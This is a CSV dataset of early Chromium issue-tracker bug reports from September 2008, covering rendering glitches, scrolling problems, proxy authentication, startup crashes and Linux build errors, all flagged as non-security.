,id,issue_id,date,report,Security,summary,description
15,15,17,2-Sep-08,Issue 17 : input type=&quot;search&quot; does not act as expected in other WebKit implementations 17 problem? 1. Visit site 2. Notice search input type does not render as expected 3. Notice the search does not have same behavior and functionality as expected  ? Esc to clear History Clear button Search icon  ?     ,0,Issue 17 : input type=&quotsearch&quot,does not act as expected in other WebKit implementations 17 problem 1. Visit site 2. Notice search input type does not render as expected 3. Notice the search does not have same behavior and functionality as expected   Esc to clear History Clear button Search icon   
16,16,18,2-Sep-08,Issue 18 : Wishlist: Chrome does not have an addon-system 890 problem? 1. Try to install an adblocking-addon 2. Fail  ? The expected result is an addon-API similiar to Firefox Extensions  allowing third parties to enhance the functionality of Chrome  ? Chrome offers next to no customization-options.     Not applicable ,0,Issue 18 : Wishlist: Chrome does not have an addon-system 890 problem,1. Try to install an adblocking-addon 2. Fail   The expected result is an addon-API similiar to Firefox Extensions  allowing third parties to enhance the functionality of Chrome   Chrome offers next to no customization-options.     Not applicable 
17,17,19,2-Sep-08,Issue 19 : Automatic integrated windows authentication (aka automatic NTLM / Negotiate Auth support) &lsaquo; Prev 5778 of 14138 Next &rsaquo; 666 problem? 1. Configure the browser to use a proxy (I use Squid 2.7/Stable 2) with authentication enabled. 2. Chrome will prompt for a username and password to auth with the proxy. 3. Browsing continues normally for the session.  ? Integrated authentication in the browser would use the current users logon credentials to authenticate with the proxy server.  ? Chrome will prompt for a username and password to auth with the proxy. Entering the credentials manually allow the user to continue normally.     ,0,Issue 19 : Automatic integrated windows authentication (aka automatic NTLM / Negotiate Auth support) &lsaquo,Prev 5778 of 14138 Next &rsaquo 666 problem 1. Configure the browser to use a proxy (I use Squid 2.7/Stable 2) with authentication enabled. 2. Chrome will prompt for a username and password to auth with the proxy. 3. Browsing continues normally for the session.   Integrated authentication in the browser would use the current users logon credentials to authenticate with the proxy server.   Chrome will prompt for a username and password to auth with the proxy. Entering the credentials manually allow the user to continue normally.     
18,18,20,2-Sep-08,Issue 20 : Chrome windows hide autohide taskbars 145 problem? 1. Rightclick the taskbar to get to the properties and enable auto-hide 2. Maximize chrome 3. Move your mouse to where your taskbar usually pops up. Nothing happens.  ?  ?     ,0,Issue 20 : Chrome windows hide autohide taskbars 145 problem,1. Rightclick the taskbar to get to the properties and enable auto-hide 2. Maximize chrome 3. Move your mouse to where your taskbar usually pops up. Nothing happens.    
19,19,21,2-Sep-08,Issue 21 : Facebook: Commenting on Status not working 7 problem? 1. Log on to facebook 2. Try to comment on any user's status  including your own 3. Regular comments on walls  etc seem to work.  ?  ?     ,0,Issue 21 : Facebook: Commenting on Status not working 7 problem,1. Log on to facebook 2. Try to comment on any user's status  including your own 3. Regular comments on walls  etc seem to work.    
20,20,22,2-Sep-08,Issue 22 : Active back button replaced by red square in Windows Vista x64 1 person starred this issue and may be notified of changes.   &nbsp;   amorken      : 0.2.149.27 (1583) URLs (if applicable) : Any   Not applicable  ? 1. Open a new tab. The inactive back button will look normal. 2. Go somewhere in that tab. 3. The back button is replaced by a red square. Mousing over the square will cause the back button to show up (after a brief transition with some jitter near the bottom part of the square.  ? A shiny active back button should show up.  ? A disappointing red square shows up.     OS: Windows Vista business edition  64 bit  6.0.6001 SP1. Display adapter: Nvidia Geforce 8800 GT  driver version 7.15.11.7512  running a 32-bit-color display mode. A screenshot is attached. ChromeRedBackbutton.png 66.6 KB &nbsp; View &nbsp; Download ,0,Issue 22 : Active back button replaced by red square in Windows Vista x64 1 person starred this issue and may be notified of changes.   &nbsp,amorken      : 0.2.149.27 (1583) URLs (if applicable) : Any   Not applicable   1. Open a new tab. The inactive back button will look normal. 2. Go somewhere in that tab. 3. The back button is replaced by a red square. Mousing over the square will cause the back button to show up (after a brief transition with some jitter near the bottom part of the square.   A shiny active back button should show up.   A disappointing red square shows up.     OS: Windows Vista business edition  64 bit  6.0.6001 SP1. Display adapter: Nvidia Geforce 8800 GT  driver version 7.15.11.7512  running a 32-bit-color display mode. A screenshot is attached. ChromeRedBackbutton.png 66.6 KB &nbsp View &nbsp Download 
21,21,23,2-Sep-08,Issue 23 : Mouse wheel drag doesn't work 3 problem? 1. Open any web page that requires a vertical scroll bar. 2. While the mouse cursor is inside the page  press and hold the mouse wheel. 3. Move the mouse up or down.  ? The web page should scroll.  ? Nothing.     If you press and release the mouse wheel (instead of press and drag) it should enter a smooth scrolling mode. While in this mode (not holding down the button)  moving the mouse up or down should scroll the same way as if you were dragging. ,0,Issue 23 : Mouse wheel drag doesn't work 3 problem,1. Open any web page that requires a vertical scroll bar. 2. While the mouse cursor is inside the page  press and hold the mouse wheel. 3. Move the mouse up or down.   The web page should scroll.   Nothing.     If you press and release the mouse wheel (instead of press and drag) it should enter a smooth scrolling mode. While in this mode (not holding down the button)  moving the mouse up or down should scroll the same way as if you were dragging. 
22,22,24,2-Sep-08,Issue 24 : Proxy causes some or all network requests to fail 34 problem? 1. Load http://www.igoogle.com/ (or any other google account page) 2. Click the Sign In link at top right 3. Kaboom.  ? Should see the sign-in screen  ? Don't see nuffin'. Just a white screen     * Using Windows Vista Enterprise. * I am connecting to the internet through a proxy server (I'm at work); could possibly be that? Not sure what else to configure since Chrome seems to use Vista's standard Internet Options (and those are configured correctly  at least as far as IE and FireFox are concerned). I have noticed that I get a password prompt from my Proxy server whenever I start Chrome. Will try downloading Chrome at home tonight to see if the problem persists. ,0,Issue 24 : Proxy causes some or all network requests to fail 34 problem,1. Load http://www.igoogle.com/ (or any other google account page) 2. Click the Sign In link at top right 3. Kaboom.   Should see the sign-in screen   Don't see nuffin'. Just a white screen     * Using Windows Vista Enterprise. * I am connecting to the internet through a proxy server (I'm at work) could possibly be that Not sure what else to configure since Chrome seems to use Vista's standard Internet Options (and those are configured correctly  at least as far as IE and FireFox are concerned). I have noticed that I get a password prompt from my Proxy server whenever I start Chrome. Will try downloading Chrome at home tonight to see if the problem persists. 
23,23,25,2-Sep-08,Issue 25 : Web inspector button &quot;dock to main window&quot; does nothing 71 problem? 1. right-click on a web element 2. click on &quot;inspect element&quot; 3. click on &quot;dock to main window&quot;  ? To have the web-inspector get docked at the bottom of the current tab.  ? Nothing.     ,0,Issue 25 : Web inspector button &quot,dock to main window&quot does nothing 71 problem 1. right-click on a web element 2. click on &quot inspect element&quot 3. click on &quot dock to main window&quot  To have the web-inspector get docked at the bottom of the current tab.   Nothing.     
24,24,26,2-Sep-08,Issue 26 : Mousewheel Scrolling with Dell Mouse Suite enabled 1 person starred this issue and may be notified of changes.   &nbsp;   sven.kuenzler      : 0.2.149.27 (1583) URLs (if applicable) : n/a    : Safari 3: ? Firefox 3: OK IE 7: OK  ? 1. Open any page which requires vertical scrolling 2. scroll down a bit 3. try to scroll up using the mouse wheel  ? Scrolling up should work  ? Scrolling down using the mouse wheel is no problem  scrolling up does not work.     When turning off the Dell Mouse Suite  everything is fine againg. However  the other browsers work as expected when the Dell suite is running. ,0,Issue 26 : Mousewheel Scrolling with Dell Mouse Suite enabled 1 person starred this issue and may be notified of changes.   &nbsp,sven.kuenzler      : 0.2.149.27 (1583) URLs (if applicable) : n/a    : Safari 3:  Firefox 3: OK IE 7: OK   1. Open any page which requires vertical scrolling 2. scroll down a bit 3. try to scroll up using the mouse wheel   Scrolling up should work   Scrolling down using the mouse wheel is no problem  scrolling up does not work.     When turning off the Dell Mouse Suite  everything is fine againg. However  the other browsers work as expected when the Dell suite is running. 
25,25,27,2-Sep-08,Issue 27 : Chrome Won't Start. 4 problem? 1. Opening Chrome 2. Opening a new tab in Chrome 3.  ? open a web page?  ? The application failed to initialize properly (0xc0000005). Chick ok to terminate the application.     Windows Vista sp1. ,0,Issue 27 : Chrome Won't Start. 4 problem,1. Opening Chrome 2. Opening a new tab in Chrome 3.   open a web page  The application failed to initialize properly (0xc0000005). Chick ok to terminate the application.     Windows Vista sp1. 
26,26,28,2-Sep-08,Issue 28 : One-word url in omnibar does not lookup the default domain FIRST then search SECOND 1 person starred this issue and may be notified of changes.   &nbsp;   evgeny.zislis      : &lt;see about:version&gt; URLs (if applicable) :    : Safari 3: OK Firefox 3: OK IE 7: OK  ? 1. Writing &quot;intranet&quot; into omnibar 2. Should automatically resolve into &quot;intranet.mycompany.com&quot; (default dns domain) 3. chrome is using a search-engine instead of going to &quot;intranet&quot;  ? Getting the &quot;intranet&quot; page loaded. Not searching for it on the internet.  ? Chrome performs a google search for &quot;intranet&quot; instead of going to the internal website.     ,0,Issue 28 : One-word url in omnibar does not lookup the default domain FIRST then search SECOND 1 person starred this issue and may be notified of changes.   &nbsp,evgeny.zislis      : &lt see about:version&gt URLs (if applicable) :    : Safari 3: OK Firefox 3: OK IE 7: OK   1. Writing &quot intranet&quot into omnibar 2. Should automatically resolve into &quot intranet.mycompany.com&quot (default dns domain) 3. chrome is using a search-engine instead of going to &quot intranet&quot  Getting the &quot intranet&quot page loaded. Not searching for it on the internet.   Chrome performs a google search for &quot intranet&quot instead of going to the internal website.     
27,27,29,2-Sep-08,Issue 29 : Gmail content does not update when resized vertically 9 problem? 1. Open a gmail inbox in a fresh Chrome tab. 2. Select &quot;Create application shortcuts&quot; from the menu directly right of the Omnibox. 3. Choose any of the shortcut options. 4. Try resizing the Gmail application window. 5. Close the Gmail application window. 6. Reopen the Gmail application windows and try resizing again. Note: Maximizing/Restoring resizes the window content correctly  but not clicking and dragging the border.  ? Expect the scrollbar length to change. Expect additional content to be displayed when increasing the vertical size of the window.  ? Scrollbar stays one size. No new content is displayed after dragging bottom edge down.     ,0,Issue 29 : Gmail content does not update when resized vertically 9 problem,1. Open a gmail inbox in a fresh Chrome tab. 2. Select &quot Create application shortcuts&quot from the menu directly right of the Omnibox. 3. Choose any of the shortcut options. 4. Try resizing the Gmail application window. 5. Close the Gmail application window. 6. Reopen the Gmail application windows and try resizing again. Note: Maximizing/Restoring resizes the window content correctly  but not clicking and dragging the border.   Expect the scrollbar length to change. Expect additional content to be displayed when increasing the vertical size of the window.   Scrollbar stays one size. No new content is displayed after dragging bottom edge down.     
28,28,30,2-Sep-08,Issue 30 : No smooth scroll 2 problem? 1. Middle click in the white space of any web page. 2. Move the mouse up and down.  ? -For most browsers  the page should move up and down at a speed according to how far away the mouse cursor is from the starting position.  ? -The cursor remains a standard arrow  the page does not scroll.     -I looked through the options and could not find a place to enable this function; I know its off by default in some browsers. While this is not necessarily a bug  it is fairly standard behavior for web browsers. ,0,Issue 30 : No smooth scroll 2 problem,1. Middle click in the white space of any web page. 2. Move the mouse up and down.   -For most browsers  the page should move up and down at a speed according to how far away the mouse cursor is from the starting position.   -The cursor remains a standard arrow  the page does not scroll.     -I looked through the options and could not find a place to enable this function I know its off by default in some browsers. While this is not necessarily a bug  it is fairly standard behavior for web browsers. 
29,29,31,2-Sep-08,Issue 31 : &quot;Become a fan&quot; on facebook does not work &nbsp;   &nbsp;   evgeny.zislis      : &lt;see about:version&gt; URLs (if applicable) :    : Safari 3: OK Firefox 3: OK IE 7: OK  ? 1. Login to facebook 2. Search for &quot;Google Chrome&quot; 3. Try to click on &quot;Become a fan&quot;  ? Some javascript should do something and facebook would make you a fan of Google Chrome.  ? Nothing.     ,0,Issue 31 : &quotBecome a fan&quoton facebook does not work &nbsp,&nbsp evgeny.zislis      : &lt see about:version&gt URLs (if applicable) :    : Safari 3: OK Firefox 3: OK IE 7: OK   1. Login to facebook 2. Search for &quot Google Chrome&quot 3. Try to click on &quot Become a fan&quot  Some javascript should do something and facebook would make you a fan of Google Chrome.   Nothing.     
30,30,32,2-Sep-08,Issue 32 : Floating div with no height and no content is not rendered (not taken into account in layout) 2 problem? &lt;div&gt; &lt;div style=&quot;width:100px; float:left;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;float:left; width:100px;&quot;&gt;test&lt;/div&gt; &lt;/div&gt;  ? &quot;test&quot; should appear offset  ? no offset ,0,Issue 32 : Floating div with no height and no content is not rendered (not taken into account in layout) 2 problem,&lt div&gt &lt div style=&quot width:100px float:left &quot &gt &lt /div&gt &lt div style=&quot float:left width:100px &quot &gt test&lt /div&gt &lt /div&gt  &quot test&quot should appear offset   no offset 
31,31,33,2-Sep-08,Issue 33 : No scrollbars appear on viewing large SVG 81 problem? 1. Open attached svg file or any svg file with more dimensions than the browser window 2. Try to scroll horizontally 3.  ? In firefox  you get a horizontal scroll bar. In IE  you can press 'ALT' and scroll.  ? No scrollbar visible. Can not scroll horizontally.     In firefox  you get a horizontal scroll bar. In IE  you can press 'ALT' and scroll. I tried to scroll by pressing 'ALT'  but that also does not work sample.svg 310 KB &nbsp; View &nbsp; Download ,0,Issue 33 : No scrollbars appear on viewing large SVG 81 problem,1. Open attached svg file or any svg file with more dimensions than the browser window 2. Try to scroll horizontally 3.   In firefox  you get a horizontal scroll bar. In IE  you can press 'ALT' and scroll.   No scrollbar visible. Can not scroll horizontally.     In firefox  you get a horizontal scroll bar. In IE  you can press 'ALT' and scroll. I tried to scroll by pressing 'ALT'  but that also does not work sample.svg 310 KB &nbsp View &nbsp Download 
32,32,34,2-Sep-08,Issue 34 : Habari admin interface is not rendered correctly 4 problem? 1. Log in to Habari's admin interface 2. Notice the incorrect rendering of the rounded input boxes upon login 3. Hover over the menu in the upper left corner and notice the opaque blur around it. Looks really strange.  ? Smooth graphics.  ? Weird graphics.     Screenshot attached. Black squares obviously for obfuscation. chromescreen.PNG 71.7 KB &nbsp; View &nbsp; Download ,0,Issue 34 : Habari admin interface is not rendered correctly 4 problem,1. Log in to Habari's admin interface 2. Notice the incorrect rendering of the rounded input boxes upon login 3. Hover over the menu in the upper left corner and notice the opaque blur around it. Looks really strange.   Smooth graphics.   Weird graphics.     Screenshot attached. Black squares obviously for obfuscation. chromescreen.PNG 71.7 KB &nbsp View &nbsp Download 
33,33,35,2-Sep-08,Issue 35 : Maximize on second larger monitor not working 67 problem? 1. Open Chrome on the primary monitor which has a smaller resolution 2. Move Chrome to the second larger resolution monitor. 3. Try to maximize and will only maximize to the resolution of the first smaller monitor  ? Maximize to the full resolution of the monitor that it is on. ,0,Issue 35 : Maximize on second larger monitor not working 67 problem,1. Open Chrome on the primary monitor which has a smaller resolution 2. Move Chrome to the second larger resolution monitor. 3. Try to maximize and will only maximize to the resolution of the first smaller monitor   Maximize to the full resolution of the monitor that it is on. 
34,34,36,2-Sep-08,Issue 36 : Error on startup 1 person starred this issue and may be notified of changes.   &nbsp;   nesti86      : 0.2.149.27 URLs (if applicable) :    : Safari 3: Firefox 3: IE 7:  ? 1. When I open the program I get an error 2. 3.  ? Error box  and I can not open any url  ?     error.JPG 42.3 KB &nbsp; View &nbsp; Download ,0,Issue 36 : Error on startup 1 person starred this issue and may be notified of changes.   &nbsp,nesti86      : 0.2.149.27 URLs (if applicable) :    : Safari 3: Firefox 3: IE 7:   1. When I open the program I get an error 2. 3.   Error box  and I can not open any url   error.JPG 42.3 KB &nbsp View &nbsp Download 
35,35,37,2-Sep-08,Issue 37 : vBulletin with no dropdowns 15 problem? 1. Log into a vBullletin powered message board 2. Notice how the stuff like Thread Tools are listed out at the bottom  ? They should be a javascript drop-down menu  ? They get listed at the bottom instead.     I suspect this may be a WebKit issue since it also happens in Safari. ,0,Issue 37 : vBulletin with no dropdowns 15 problem,1. Log into a vBullletin powered message board 2. Notice how the stuff like Thread Tools are listed out at the bottom   They should be a javascript drop-down menu   They get listed at the bottom instead.     I suspect this may be a WebKit issue since it also happens in Safari. 
36,36,38,2-Sep-08,Issue 38 : The application failed to initialize properly (0xC0000005). Sandbox conflict with Symantec Security. 43 problem? 1. Windows XP SP3 2. Right after I installed Google Chrome Web Browser 3. Double click on Chrome icon  ? Error dialog raises: &quot;The application failed to initialize properly (0x00000005). Press on Ok to terminate application.&quot;  ? Nothing else happens... chrome1.jpg 38.6 KB &nbsp; View &nbsp; Download chrome2.jpg 35.7 KB &nbsp; View &nbsp; Download ,0,Issue 38 : The application failed to initialize properly (0xC0000005). Sandbox conflict with Symantec Security. 43 problem,1. Windows XP SP3 2. Right after I installed Google Chrome Web Browser 3. Double click on Chrome icon   Error dialog raises: &quot The application failed to initialize properly (0x00000005). Press on Ok to terminate application.&quot  Nothing else happens... chrome1.jpg 38.6 KB &nbsp View &nbsp Download chrome2.jpg 35.7 KB &nbsp View &nbsp Download 
37,37,39,2-Sep-08,Issue 39 : Error 4 on re-installing Chrome 4 problem? 1. 2. 3.  ?  ? I installed the Danish version of Chrome  then uninstalled it to reinstall the English version  and the attached error message occurs at the end of the installation process.     chrome_error_installing.JPG 12.1 KB &nbsp; View &nbsp; Download ,0,Issue 39 : Error 4 on re-installing Chrome 4 problem,1. 2. 3.    I installed the Danish version of Chrome  then uninstalled it to reinstall the English version  and the attached error message occurs at the end of the installation process.     chrome_error_installing.JPG 12.1 KB &nbsp View &nbsp Download 
38,38,40,2-Sep-08,Issue 40 : More options in Options menu. The basis of a Browser: is to give the user the most controll. 1 person starred this issue and may be notified of changes.   &nbsp;   kidyelman      : 0.2.149.27 (1583) URLs (if applicable) :    : Safari 3: ok Firefox 3: ok IE 7: ok  ? 1. See lack of options  ? 1. Options to let the user control the browser. 2. Need more options  like  what window to open up when a new tab is opened  and security stuff.  ? ...uhh...no options? ,0,Issue 40 : More options in Options menu. The basis of a Browser: is to give the user the most controll. 1 person starred this issue and may be notified of changes.   &nbsp,kidyelman      : 0.2.149.27 (1583) URLs (if applicable) :    : Safari 3: ok Firefox 3: ok IE 7: ok   1. See lack of options   1. Options to let the user control the browser. 2. Need more options  like  what window to open up when a new tab is opened  and security stuff.   ...uhh...no options 
39,39,41,2-Sep-08,Issue 41 : Adding music in Pitchfork doesn't seem to work 2 problem? 1. Install pitchfork on a server 2. Surf to the pitchfork-url 3. Try to add music to the playlist  ?  ?     ,0,Issue 41 : Adding music in Pitchfork doesn't seem to work 2 problem,1. Install pitchfork on a server 2. Surf to the pitchfork-url 3. Try to add music to the playlist    
40,40,42,2-Sep-08,Issue 42 : Mouse wheel scrolls down but not up 5 problem? 1. Try to use the mouse wheel to scroll the page up  ? The page scroll up  ? Nothing ,0,Issue 42 : Mouse wheel scrolls down but not up 5 problem,1. Try to use the mouse wheel to scroll the page up   The page scroll up   Nothing 
41,41,43,2-Sep-08,Issue 43 : component one controls do nto display 1 person starred this issue and may be notified of changes.   &nbsp;   yzidell    I have a web page that contains component one controls - it works well in ie 6-7 and FierFox 3 - but google chrome does not display it all.   : latest URLs (if applicable) :    : Safari 3: Firefox 3:OK IE 7:OK  ?  ?     ,0,Issue 43 : component one controls do nto display 1 person starred this issue and may be notified of changes.   &nbsp,yzidell    I have a web page that contains component one controls - it works well in ie 6-7 and FierFox 3 - but google chrome does not display it all.   : latest URLs (if applicable) :    : Safari 3: Firefox 3:OK IE 7:OK    
42,42,44,2-Sep-08,Issue 44 : Stacktrace when running './depot_tools/gclient sync' on Linux 4 problem? 1. follow http://dev.chromium.org/developers/how-tos/build-instructions-linux 2. when running './depot_tools/gclient sync'  observe output  ? No stacktrace ;)  ? ________ running 'svn update' in '/home/arnouten/dev/chromium/chrome' At revision 1651 . Traceback (most recent call last): File &quot;/home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot;  line 925  in &lt;module&gt; result = Main(sys.argv) File &quot;/home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot;  line 921  in Main return DispatchCommand(command  options  args) File &quot;/home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot;  line 885  in DispatchCommand return command_map[command](options  args) File &quot;/home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot;  line 837  in DoUpdate return update_all(client  options  args) File &quot;/home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot;  line 713  in UpdateAll deps = get_all_deps(client  entries) File &quot;/home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot;  line 576  in GetAllDeps solution_deps = get_default_solution_deps(client  solution[&quot;name&quot;]) File &quot;/home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot;  line 537  in GetDefaultSolutionDeps deps = scope[&quot;deps&quot;] KeyError: 'deps'     ,0,Issue 44 : Stacktrace when running './depot_tools/gclient sync' on Linux 4 problem,1. follow http://dev.chromium.org/developers/how-tos/build-instructions-linux 2. when running './depot_tools/gclient sync'  observe output   No stacktrace  )   ________ running 'svn update' in '/home/arnouten/dev/chromium/chrome' At revision 1651 . Traceback (most recent call last): File &quot /home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot line 925  in &lt module&gt result = Main(sys.argv) File &quot /home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot line 921  in Main return DispatchCommand(command  options  args) File &quot /home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot line 885  in DispatchCommand return command_map[command](options  args) File &quot /home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot line 837  in DoUpdate return update_all(client  options  args) File &quot /home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot line 713  in UpdateAll deps = get_all_deps(client  entries) File &quot /home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot line 576  in GetAllDeps solution_deps = get_default_solution_deps(client  solution[&quot name&quot ]) File &quot /home/arnouten/dev/chromium/depot_tools/release/gclient.py&quot line 537  in GetDefaultSolutionDeps deps = scope[&quot deps&quot ] KeyError: 'deps'     
43,43,45,2-Sep-08,Issue 45 : Please remove horrible yellow borders round text boxes 3 problem? 1. Go to any website with an input textbox 2. Click into the text box 3. Observe the horrible yellow line round the text box  ? I expect the browser not to interfere with the styling of my websites  ? It does interfere with the design by putting a horrible yellow line round my text boxes     The only other browser that does this is Safari and it looks ugly there too. We often put textboxes inside a div with rounded corners for example and try to hide the actual textbox. This can look really nice until Safari/Chrome interferes with it. Please remove this 'feature' Jon ,0,Issue 45 : Please remove horrible yellow borders round text boxes 3 problem,1. Go to any website with an input textbox 2. Click into the text box 3. Observe the horrible yellow line round the text box   I expect the browser not to interfere with the styling of my websites   It does interfere with the design by putting a horrible yellow line round my text boxes     The only other browser that does this is Safari and it looks ugly there too. We often put textboxes inside a div with rounded corners for example and try to hide the actual textbox. This can look really nice until Safari/Chrome interferes with it. Please remove this 'feature' Jon 
44,44,46,2-Sep-08,Issue 46 : Linux build interrupts with &quot;KeyError: 'deps'&quot; at &quot;./depot_tools/gclient sync&quot; 3 problem? 1. Build Instructions (Linux) up to `#&gt; ./depot_tools/gclient sync'  ? to continue building...  ? build interrupts with &gt; KeyError: 'deps' &lt;     nick@weg:/tmp/chrome&gt; ./depot_tools/gclient sync ________ running 'svn update' in '/tmp/chrome/chrome' At revision 1651 . Traceback (most recent call last): File &quot;./depot_tools/release/gclient.py&quot;  line 925  in &lt;module&gt; result = Main(sys.argv) File &quot;./depot_tools/release/gclient.py&quot;  line 921  in Main return DispatchCommand(command  options  args) File &quot;./depot_tools/release/gclient.py&quot;  line 885  in DispatchCommand return command_map[command](options  args) File &quot;./depot_tools/release/gclient.py&quot;  line 837  in DoUpdate return update_all(client  options  args) File &quot;./depot_tools/release/gclient.py&quot;  line 713  in UpdateAll deps = get_all_deps(client  entries) File &quot;./depot_tools/release/gclient.py&quot;  line 576  in GetAllDeps solution_deps = get_default_solution_deps(client  solution[&quot;name&quot;]) File &quot;./depot_tools/release/gclient.py&quot;  line 537  in GetDefaultSolutionDeps deps = scope[&quot;deps&quot;] KeyError: 'deps' ,0,Issue 46 : Linux build interrupts with &quot,KeyError: 'deps'&quot at &quot ./depot_tools/gclient sync&quot 3 problem 1. Build Instructions (Linux) up to `#&gt ./depot_tools/gclient sync'   to continue building...   build interrupts with &gt KeyError: 'deps' &lt nick@weg:/tmp/chrome&gt ./depot_tools/gclient sync ________ running 'svn update' in '/tmp/chrome/chrome' At revision 1651 . Traceback (most recent call last): File &quot ./depot_tools/release/gclient.py&quot line 925  in &lt module&gt result = Main(sys.argv) File &quot ./depot_tools/release/gclient.py&quot line 921  in Main return DispatchCommand(command  options  args) File &quot ./depot_tools/release/gclient.py&quot line 885  in DispatchCommand return command_map[command](options  args) File &quot ./depot_tools/release/gclient.py&quot line 837  in DoUpdate return update_all(client  options  args) File &quot ./depot_tools/release/gclient.py&quot line 713  in UpdateAll deps = get_all_deps(client  entries) File &quot ./depot_tools/release/gclient.py&quot line 576  in GetAllDeps solution_deps = get_default_solution_deps(client  solution[&quot name&quot ]) File &quot ./depot_tools/release/gclient.py&quot line 537  in GetDefaultSolutionDeps deps = scope[&quot deps&quot ] KeyError: 'deps' 
45,45,47,2-Sep-08,Issue 47 : Google Chrome not rendering the Acid 2 test correctly 1 person starred this issue and may be notified of changes.   &nbsp;   coldkill1      : &lt;see about:version&gt; URLs (if applicable) : http://www.webstandards.org/files/acid2/test.html#top   Internet Explorer 6/7/8  FireFox 2/3  Opera  : Safari 3: Firefox 3: OK IE 7: Fail IE 8: OK  ? 1. Go to the above link  the image rendered is not correct according to http://www.webstandards.org/files/acid2/reference.html  ? http://www.webstandards.org/files/acid2/reference.html A smiley face with Hello World! written above.  ? The eyes are rendered with a red cross hatching instead of like the reference image.     chrome_bug.jpg 246 KB &nbsp; View &nbsp; Download ,0,Issue 47 : Google Chrome not rendering the Acid 2 test correctly 1 person starred this issue and may be notified of changes.   &nbsp,coldkill1      : &lt see about:version&gt URLs (if applicable) : http://www.webstandards.org/files/acid2/test.html#top   Internet Explorer 6/7/8  FireFox 2/3  Opera  : Safari 3: Firefox 3: OK IE 7: Fail IE 8: OK   1. Go to the above link  the image rendered is not correct according to http://www.webstandards.org/files/acid2/reference.html   http://www.webstandards.org/files/acid2/reference.html A smiley face with Hello World! written above.   The eyes are rendered with a red cross hatching instead of like the reference image.     chrome_bug.jpg 246 KB &nbsp View &nbsp Download 
46,46,48,2-Sep-08,Issue 48 : Scons.py file and scons directory not included within SVN tree 1 person starred this issue and may be notified of changes.   &nbsp;   Steve.Salevan      : SVN:Head URLs (if applicable) :    : Safari 3: N/A Firefox 3: N/A IE 7: N/A  ? 1. Follow Linux build instructions available at: http://dev.chromium.org/developers/how-tos/build-instructions-linux 2. Attempt to run $CHROMIUM_ROOT/chrome/third_party/scons/scons.py Hammer  ? Build starts  ? File not found error     I attempted a build with my distribution's version of Scons (Fedora 9  scons-0.98.4-2)  but I seem to be unable to build anything with it. When running the scons chrome command  I get something like this  where /home/ssalevan/chromium/ is my $CHROMIUM_ROOT: [ssalevan@marillion chrome]$ pwd /home/ssalevan/chromium/chrome [ssalevan@marillion chrome]$ scons chrome scons: Reading SConscript files ... scons: warning: Ignoring missing SConscript '/home/ssalevan/chromium/build/SConscript.main' File &quot;/home/ssalevan/chromium/chrome/SConstruct&quot;  line 7  in &lt;module&gt; scons: done reading SConscript files. scons: Building targets ... scons: *** Do not know how to make target `chrome'. Stop. scons: building terminated because of errors. ,0,Issue 48 : Scons.py file and scons directory not included within SVN tree 1 person starred this issue and may be notified of changes.   &nbsp,Steve.Salevan      : SVN:Head URLs (if applicable) :    : Safari 3: N/A Firefox 3: N/A IE 7: N/A   1. Follow Linux build instructions available at: http://dev.chromium.org/developers/how-tos/build-instructions-linux 2. Attempt to run $CHROMIUM_ROOT/chrome/third_party/scons/scons.py Hammer   Build starts   File not found error     I attempted a build with my distribution's version of Scons (Fedora 9  scons-0.98.4-2)  but I seem to be unable to build anything with it. When running the scons chrome command  I get something like this  where /home/ssalevan/chromium/ is my $CHROMIUM_ROOT: [ssalevan@marillion chrome]$ pwd /home/ssalevan/chromium/chrome [ssalevan@marillion chrome]$ scons chrome scons: Reading SConscript files ... scons: warning: Ignoring missing SConscript '/home/ssalevan/chromium/build/SConscript.main' File &quot /home/ssalevan/chromium/chrome/SConstruct&quot line 7  in &lt module&gt scons: done reading SConscript files. scons: Building targets ... scons: *** Do not know how to make target `chrome'. Stop. scons: building terminated because of errors. 
